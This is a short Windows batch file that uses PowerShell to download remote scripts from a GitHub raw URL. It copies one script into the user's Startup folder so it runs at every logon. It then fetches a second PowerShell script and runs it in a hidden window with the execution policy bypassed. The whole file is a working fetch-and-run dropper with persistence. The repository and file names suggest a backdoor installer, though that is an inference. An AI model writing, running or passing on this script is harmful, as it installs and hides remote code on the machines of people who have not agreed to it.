@echo off
powershell.exe -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/blousekool/BDtools/main/bd/usbinstaller.cmd' -OutFile $env:temp\usbinstaller.cmd; Move-Item $env:temp\usbinstaller.cmd \"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\usbinstaller.cmd\""
powershell.exe /c Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BDtools/main/bd/nadmin_dinstall.ps1" -OutFile $env:temp/nadmin_dinstall.ps1;Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -File "%Temp%\nadmin_dinstall.ps1"' -WindowStyle Hidden
exit